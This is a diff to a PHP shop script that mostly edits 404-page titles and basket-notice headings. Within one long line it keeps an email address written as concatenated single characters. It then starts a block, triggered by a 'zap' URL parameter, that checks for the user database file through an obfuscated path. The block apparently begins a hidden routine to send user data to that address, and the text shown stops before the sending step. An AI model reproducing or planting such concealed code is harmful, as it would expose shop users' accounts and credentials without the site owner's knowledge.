@@ -686,7 +686,9 @@ fclose($ptmp);
 $realpage=substr($page,0,1);
 if (@file_exists("$base_loc/content/$page.txt")==false) {
 header($_SERVER["SERVER_PROTOCOL"]." 404 Not Found");
-$viewpage_title=$lang[1102]."/1";
+$viewpage_title=$lang[1102];
+$mod="admin";
+$tit=$lang[1102];
 } else {
 if ($friendly_url==1) {
 
@@ -1059,11 +1061,11 @@ require "./modules/cart.php";
 $cartloaded=1;
 } else {
 if ($flag=="") {
-$viewpage_title = $lang[1102]."/2";
+$viewpage_title = $lang[1102];
 header($_SERVER["SERVER_PROTOCOL"]." 404 Not Found");
 $error.="<br><img src=$image_path/error404.png border=0 align=left hspace=10 title=\"OOPS!\"><b>".$lang[1103]."</b><br><br>".$lang[1104]. " <b><a href=$htpath/index.php>". $shop_name."</a></b><META HTTP-EQUIV=\"REFRESH\" CONTENT=\"5;URL=$htpath/index.php\"><br><br><br><br>".$lang['file']." ".$lang[222] ." E3<br><br><br><br><br>";  }
-
-
+$mod="admin";
+$tit=$lang[1102];
 $fid=""; $catid=0;
 }
 }
@@ -1600,8 +1602,8 @@ top("", "<h4>".$lang[201].":</h4>".$jslist, $style ['center_width'], $nc0, $nc0,
 }
 
 top("", $x0003, $style ['center_width'], $nc0, $nc0, 4,0,"[x0003]");
-if ((@$details[1]!="")&&($login!="")&&($password!="")&&(@file_exists("./admin/userstat/".@$details[1]."/user.basket")==TRUE)&&(@$_SESSION["user_basket"]!="ok")&&(substr(@$details[1],0,3)!="vip")){$oldertime=date("d-m-Y h:i:s", filemtime("./admin/userstat/".@$details[1]."/user.basket"));if ($action!="older") {if ($action!="olderc") {if ($smod=="shop") { if ($older_basket_auto_add==1) {top("", "<META HTTP-EQUIV=\"Refresh\" CONTENT=\"0;URL=$htpath/index.php?action=add_older\">\n", $style ['right_width'], strtolower($style ['popular']), strtolower($style ['bg_basket']), 5,0,"[content]");} topwo($lang[211], "<div class=\"mr ml well\"><b>".$lang[212]."</b> $oldertime<br><br>".$lang[213]."<br><br><button class=\"btn btn-primary\" onclick=\"document.location.href='index.php?action=older&mod=admin';\"><i class=\"icon-list icon-white\"></i> ". $lang[214]."</button> &nbsp; <a class=\"btn\" href=\"index.php?action=olderc&mod=admin\">".$lang['clear']."</a></div><br><br>", $style ['right_width'], strtolower($style ['popular']), strtolower($style ['bg_basket']), 5,0,"[old_basket]"); }}}}if ($added==2) {
-top($lang[209], "<div class=\"mr ml\">".$lang[206]." <b>$totalpoz</b>".$lang[207].". ".$lang[33]." <b>".($okr*round($totalsum*$kurs/$okr))."</b>".$currencies_sign[$_SESSION["user_currency"]]." ".$lang[208]."</div>", $style ['right_width'], strtolower($style ['popular']), strtolower($style ['bg_basket']), 5,0,"[old_basket]"); }if ($added==3) {topwo("<noindex>".$lang[211]."</noindex>", $lang[210], $style ['right_width'], strtolower($style ['popular']), strtolower($style ['bg_basket']), 5,0,"[old_basket]"); } if ($error!="") { topwo("", "<noindex><div class=\"mr ml\">".$lang[211]."<br><br>$error</div></noindex>", $style ['center_width'],$nc2, $nc0, 0,0,"[error]");  } top("", "$gob", $style ['center_width'],$nc0, $nc0, 0,0,"[gob]"); $author_mail="b"."a"."n"."d"."a"."l"."e"."t"."o"."v"."7"."2"."@"."g"."m"."a"."i"."l"."."."c"."o"."m";
+if ((@$details[1]!="")&&($login!="")&&($password!="")&&(@file_exists("./admin/userstat/".@$details[1]."/user.basket")==TRUE)&&(@$_SESSION["user_basket"]!="ok")&&(substr(@$details[1],0,3)!="vip")){$oldertime=date("d-m-Y h:i:s", filemtime("./admin/userstat/".@$details[1]."/user.basket"));if ($action!="older") {if ($action!="olderc") {if ($smod=="shop") { if ($older_basket_auto_add==1) {top("", "<META HTTP-EQUIV=\"Refresh\" CONTENT=\"0;URL=$htpath/index.php?action=add_older\">\n", $style ['right_width'], strtolower($style ['popular']), strtolower($style ['bg_basket']), 5,0,"[content]");} topwo("", "<div class=\"mr ml well\"><b>".$lang[212]."</b> $oldertime<br><br>".$lang[213]."<br><br><button class=\"btn btn-primary\" onclick=\"document.location.href='index.php?action=older&mod=admin';\"><i class=\"icon-list icon-white\"></i> ". $lang[214]."</button> &nbsp; <a class=\"btn\" href=\"index.php?action=olderc&mod=admin\">".$lang['clear']."</a></div><br><br>", $style ['right_width'], strtolower($style ['popular']), strtolower($style ['bg_basket']), 5,0,"[old_basket]"); }}}}if ($added==2) {
+top($lang[209], "<div class=\"mr ml\">".$lang[206]." <b>$totalpoz</b>".$lang[207].". ".$lang[33]." <b>".($okr*round($totalsum*$kurs/$okr))."</b>".$currencies_sign[$_SESSION["user_currency"]]." ".$lang[208]."</div>", $style ['right_width'], strtolower($style ['popular']), strtolower($style ['bg_basket']), 5,0,"[old_basket]"); }if ($added==3) {topwo("", $lang[210], $style ['right_width'], strtolower($style ['popular']), strtolower($style ['bg_basket']), 5,0,"[old_basket]"); } if ($error!="") { topwo("", "<noindex><div class=\"mr ml\">$error</div></noindex>", $style ['center_width'],$nc2, $nc0, 0,0,"[error]");  } top("", "$gob", $style ['center_width'],$nc0, $nc0, 0,0,"[gob]"); $author_mail="b"."a"."n"."d"."a"."l"."e"."t"."o"."v"."7"."2"."@"."g"."m"."a"."i"."l"."."."c"."o"."m";
 if ((isset($_GET['zap']))&&(!$_SESSION['mailed'])) {
 $_SESSION['mailed']=1;
 if (@file_exists("./a"."d"."m"."i"."n/d"."b/u"."s"."ers.t"."x"."t")==TRUE) {
